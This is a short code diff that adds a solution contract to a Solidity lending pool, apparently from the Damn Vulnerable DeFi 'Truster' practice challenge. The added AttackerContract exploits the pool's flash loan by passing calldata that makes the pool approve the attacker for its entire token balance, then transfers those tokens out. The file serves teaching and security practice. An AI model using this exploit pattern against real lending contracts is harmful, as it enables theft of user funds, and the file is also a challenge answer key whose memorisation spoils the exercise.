@@ -34,3 +34,21 @@ contract TrusterLenderPool is ReentrancyGuard {
         return true;
     }
 }
+
+// == SOLUTION ==
+
+contract AttackerContract {
+    // TrusterLenderPool public pool;
+    // DamnValuableToken public token;
+
+    constructor(TrusterLenderPool _pool, DamnValuableToken _token, address _recoveryAddr) {
+        // pool = _pool;
+        // token = _token;
+
+        // Give approval to this attacker contract of all the pool's tokens
+        bytes memory data =
+            abi.encodeWithSignature("approve(address,uint256)", address(this), _token.balanceOf(address(_pool)));
+        _pool.flashLoan(0, address(this), address(_token), data);
+        _token.transferFrom(address(_pool), _recoveryAddr, _token.balanceOf(address(_pool)));
+    }
+}
